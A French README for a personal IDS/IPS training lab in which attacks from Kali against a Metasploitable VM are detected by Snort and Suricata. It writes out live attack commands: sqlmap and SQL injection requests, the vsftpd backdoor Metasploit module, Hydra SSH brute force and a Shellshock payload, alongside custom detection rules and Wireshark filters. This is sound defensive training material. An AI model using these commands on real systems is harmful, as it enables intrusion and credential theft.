# IDS/IPS Lab — Snort & Suricata avec Simulation d'Attaques

> Simulation d'un environnement SOC Tier 1-2 avec détection d'intrusion en temps réel, analyse de trafic réseau et investigation d'alertes

---

## Avertissements

> Ce projet a été réalisé selon une optique de recherche personnel et d'auto-apprentissage.
> Les attaques simulées doivent uniquement être exécutées dans un environnement **isolé et contrôlé**.
> L'utilisation de ces techniques sur des systèmes sans autorisation explicite est **illégale**.

---

## Table des Matières

- [Vue d'ensemble](#-vue-densemble)
- [Architecture](#-architecture)
- [Deploiement local](#-deploiement-local)
- [Attaques simulées](#-attaques-simulées)
- [Analyse avec Wireshark](#-analyse-avec-wireshark)
- [Règles IDS personnalisées](#-règles-ids-personnalisées)
- [Structure du projet](#-structure-du-projet)
- [Compétences développées](#-Compétences-développées)

---

## Vue d'ensemble

Ce lab reproduit un environnement de **détection d'intrusion réseau** (IDS/IPS) tel qu'utilisé dans les SOC professionnels. 
Il couvre :

| Composant | Rôle |
|-----------|------|
| **Snort 3** | IDS/IPS — détection par signatures |
| **Suricata** | IDS/IPS — détection multi-thread + EVE JSON |
| **Wireshark** | Analyse de paquets & PCAPs |
| **Kali Linux** | Machine attaquante |
| **Metasploitable 2/3** | Cible vulnérable |
| **Ubuntu Server** | Superviseur réseau / collecte logs |

### Ce que ce projet simule
- Détection d'intrusion en **temps réel**
- Investigation d'alertes sur base de **télémétrie IDS**
- Analyse de **PCAPs** post-incident
- **Tuning de règles** pour réduire les faux positifs
- Tâches typiques d'un **analyste SOC Tier 1–2**

---

## Architecture

```
┌──────────────────────────────────────────────────────────┐
│                    RÉSEAU INTERNE                         │
│                  (192.168.56.0/24)                       │
│                                                          │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐  │
│  │  Kali Linux │    │  IDS Node   │    │Metasploitable│ │
│  │ (Attaquant) │───▶│Snort/Surica │───▶│  (Cible)    │  │
│  │192.168.56.10│    │192.168.56.20│    │192.168.56.30│  │
│  └─────────────┘    └──────┬──────┘    └─────────────┘  │
│                            │                             │
│                     ┌──────▼──────┐                     │
│                     │   Ubuntu    │                     │
│                     │  Monitor    │                     │
│                     │192.168.56.40│                     │
│                     │  Wireshark  │                     │
│                     │  Logs/SIEM  │                     │
│                     └─────────────┘                     │
└──────────────────────────────────────────────────────────┘
```
---

## Structure du Projet

```
ids-ips-lab/
│
│
├── virtualbox/                        
│   ├── Vagrantfile                    
│   ├── scripts/
│   │   ├── install-suricata.sh        
│   │   ├── install-snort3.sh          
│   │   ├── attack-simulation.sh       
│   │   └── collect-evidence.sh        
│   ├── configs/
│   │   ├── suricata.yaml              
│   │   └── snort.lua                  
│   └── rules/
│       ├── local.rules                
│       └── suricata-local.rules       
│
├── dashboards/
│   └── alert-dashboard.py             
```
---

## — Deploiement local


#### Étape 1 — Démarrer les VMs avec Vagrant

```bash
cd virtualbox
vagrant up
```

Cela démarre automatiquement :
- `ids-node` — Suricata + Snort installés
- `monitor` — Wireshark + collecte de logs
- `metasploitable` — Cible vulnérable


#### Étape 2 — Configurer le réseau Host-Only

```bash
# Dans VirtualBox : Fichier > Gestionnaire de réseau hôte
# Créer vboxnet0 : 192.168.56.1/24, DHCP désactivé
```

#### Étape 3 — Installer Suricata sur ids-node

```bash
vagrant ssh ids-node
sudo bash /vagrant/scripts/install-suricata.sh
```

#### Étape 4 — Installer Snort 3 sur ids-node

```bash
sudo bash /vagrant/scripts/install-snort3.sh
```

#### Étape 5 — Démarrer la capture

```bash
# Sur ids-node
sudo suricata -c /etc/suricata/suricata.yaml -i eth1 -D
sudo tail -f /var/log/suricata/eve.json | jq '.alert // empty'
```

---

### Scripts VirtualBox

#### `virtualbox/Vagrantfile`
Définit les 3 VMs, le réseau host-only, et les provisioning scripts.

#### `virtualbox/scripts/install-suricata.sh`
Installation complète de Suricata avec mise à jour des règles ET/Open.

#### `virtualbox/scripts/install-snort3.sh`
Compilation et installation de Snort 3 depuis les sources.

#### `virtualbox/scripts/attack-simulation.sh`
Lance automatiquement les scénarios d'attaques depuis Kali.

---

## Attaques Simulées

### 1. Scan Nmap (Reconnaissance)

```bash
# Depuis Kali Linux
# Scan SYN furtif
sudo nmap -sS -O -p- 192.168.56.30

# Scan de services avec scripts NSE
sudo nmap -sV -sC --script=vuln 192.168.56.30

# Scan UDP
sudo nmap -sU --top-ports 100 192.168.56.30
```

**Alertes attendues :**
- `ET SCAN Nmap Scripting Engine User-Agent Detected`
- `GPL SCAN NULL`
- `ET SCAN NMAP OS Detection Probe`

---

### 2. SQL Injection (OWASP Top 10)

```bash
# SQLMap contre DVWA sur Metasploitable
sqlmap -u "http://192.168.56.30/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx; security=low" \
  --dbs --batch

# Injection manuelle
curl "http://192.168.56.30/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" \
  --cookie "PHPSESSID=xxx; security=low"
```

**Alertes attendues :**
- `ET WEB_SPECIFIC_APPS SQL Injection Attempt`
- `ET SQL Generic INSERT attempt`

---

### 3. Exploitation FTP (Metasploit)

```bash
# vsftpd 2.3.4 backdoor (CVE-2011-2523)
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.30
run
```

**Alertes attendues :**
- `ET EXPLOIT VSFTPD Backdoor User Login`
- `GPL FTP SITE EXEC`

---

### 4. Brute Force SSH

```bash
# Hydra SSH brute force
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.56.30 -t 4 -V

# Medusa
medusa -h 192.168.56.30 -u msfadmin -P /usr/share/wordlists/rockyou.txt \
  -M ssh -t 4
```

**Alertes attendues :**
- `ET SCAN SSH BruteForce Tool`
- `Snort: SCAN SSH Brute Force`

---

### 5. Shellshock (CVE-2014-6271)

```bash
curl -A "() { :; }; /bin/bash -c 'id'" \
  http://192.168.56.30/cgi-bin/status
```

**Alertes attendues :**
- `ET WEB_SERVER Possible Shellshock Exploitation`
- `GPL WEB_SERVER Shellshock`

---

### 6. Scan de vulnérabilités avec Nikto

```bash
nikto -h http://192.168.56.30 -o scan-results.txt -Format txt
```

---

## Analyse avec Wireshark

### Capture du trafic

```bash
# Sur ids-node — capture réseau complète
sudo tcpdump -i eth1 -w /tmp/capture-$(date +%Y%m%d-%H%M%S).pcap

# Avec filtre par hôte
sudo tcpdump -i eth1 host 192.168.56.10 -w /tmp/kali-traffic.pcap

# Filtre protocoles sensibles
sudo tcpdump -i eth1 'tcp port 21 or tcp port 22 or tcp port 80 or tcp port 443' \
  -w /tmp/services.pcap
```

### Filtres Wireshark Essentiels

```wireshark
# Trafic SQL Injection
http contains "OR" && http contains "1=1"

# Scan Nmap SYN
tcp.flags.syn==1 && tcp.flags.ack==0 && !tcp.analysis.retransmission

# Brute Force SSH (connexions multiples en peu de temps)
tcp.port==22 && tcp.flags.syn==1

# FTP suspects
ftp.request.command == "USER" || ftp.request.command == "PASS"

# Shellshock dans User-Agent
http.user_agent contains "{"

# Trafic ICMP (ping sweep)
icmp.type==8

# Exfiltration DNS
dns.qry.name contains ".evil"
```

### Analyse des PCAPs post-incident

```bash
# Extraire les flux HTTP
tshark -r capture.pcap -Y "http" -T fields \
  -e http.request.method -e http.request.uri -e ip.src

# Statistiques des connexions
tshark -r capture.pcap -q -z conv,tcp

# Exports d'objets HTTP (fichiers téléchargés)
tshark -r capture.pcap --export-objects http,./extracted/
```

---

## Règles IDS Personnalisées

### Règles Snort 3 (`virtualbox/rules/local.rules`)

```snort
# Détection scan Nmap agressif
alert tcp any any -> $HOME_NET any (
  msg:"LOCAL SCAN Nmap Aggressive Scan Detected";
  flags:S;
  threshold:type both,track by_src,count 20,seconds 5;
  classtype:attempted-recon;
  sid:9000001; rev:1;
)

# SQL Injection basique
alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (
  msg:"LOCAL SQL Injection Attempt Classic";
  flow:to_server,established;
  content:"OR"; nocase;
  content:"1=1"; nocase;
  classtype:web-application-attack;
  sid:9000002; rev:1;
)

# Shellshock
alert http any any -> $HTTP_SERVERS $HTTP_PORTS (
  msg:"LOCAL Shellshock CVE-2014-6271 Attempt";
  flow:to_server,established;
  http_header;
  content:"() {";
  classtype:attempted-user;
  sid:9000003; rev:1;
)

# FTP Backdoor vsftpd
alert tcp any any -> $HOME_NET 21 (
  msg:"LOCAL EXPLOIT vsftpd 2.3.4 Backdoor Login";
  flow:to_server,established;
  content:"USER"; content:":)";
  classtype:attempted-admin;
  sid:9000004; rev:1;
)

# Brute Force SSH
alert tcp any any -> $HOME_NET 22 (
  msg:"LOCAL SSH Brute Force Attempt";
  flags:S;
  threshold:type both,track by_src,count 10,seconds 30;
  classtype:attempted-user;
  sid:9000005; rev:1;
)

# Exfiltration DNS suspecte (domaines longs)
alert dns any any -> any any (
  msg:"LOCAL Possible DNS Exfiltration Long Query";
  dns_query;
  pcre:"/^.{50,}\./";
  classtype:trojan-activity;
  sid:9000006; rev:1;
)
```

### Règles Suricata (`virtualbox/rules/suricata-local.rules`)

```yaml
# Format Suricata (compatible Snort)
alert http any any -> $HTTP_SERVERS any (
  msg:"LOCAL WEBATTACK SQL Injection UNION SELECT";
  flow:established,to_server;
  http_uri;
  content:"UNION"; nocase;
  content:"SELECT"; nocase;
  within:20;
  classtype:web-application-attack;
  sid:9100001; rev:1;
)

alert http any any -> $HTTP_SERVERS any (
  msg:"LOCAL WEBATTACK Directory Traversal";
  flow:established,to_server;
  http_uri;
  content:"../";
  pcre:"/(\.\.[\/\\\\]){3,}/";
  classtype:web-application-attack;
  sid:9100002; rev:1;
)
```

---

## Monitoring & Dashboard

### Visualisation des alertes EVE JSON (Suricata)

```bash
# Résumé des alertes du jour
cat /var/log/suricata/eve.json | \
  jq -r 'select(.event_type=="alert") | 
  [.timestamp, .alert.severity, .alert.signature, .src_ip, .dest_ip] | 
  @tsv' | sort | uniq -c | sort -rn | head -20

# Top 10 des signatures déclenchées
cat /var/log/suricata/eve.json | \
  jq -r 'select(.event_type=="alert") | .alert.signature' | \
  sort | uniq -c | sort -rn | head -10

# Alertes critiques (severity 1)
cat /var/log/suricata/eve.json | \
  jq 'select(.event_type=="alert" and .alert.severity==1)'
```

### Dashboard Python inclus

```bash
# Générer un rapport HTML des alertes
python3 dashboards/alert-dashboard.py \
  --input /var/log/suricata/eve.json \
  --output report.html
```

---

## Compétences Développées

| Domaine | Compétences |
|---------|-------------|
| **IDS/IPS** | Configuration Snort 3 & Suricata, tuning de règles, réduction des faux positifs |
| **Réseau** | Protocoles TCP/IP, analyse de flux, détection d'anomalies |
| **Forensics** | Analyse PCAP, reconstruction de sessions, extraction d'artefacts |
| **Attaques** | Nmap, SQLi, Metasploit, brute force, CVE exploitation |
| **Outils SOC** | Wireshark, EVE JSON, alertes temps réel, corrélation d'événements |
| **DevOps/Cloud** | Terraform, Ansible, AWS, automatisation |
| **Scripting** | Bash, Python, jq pour analyse de logs |


---

## Ressources

- [Suricata Documentation](https://docs.suricata.io)
- [Snort 3 User Guide](https://snort.org/documents)
- [Emerging Threats Rules](https://rules.emergingthreats.net)
- [Wireshark Display Filters Reference](https://wiki.wireshark.org/DisplayFilters)
- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
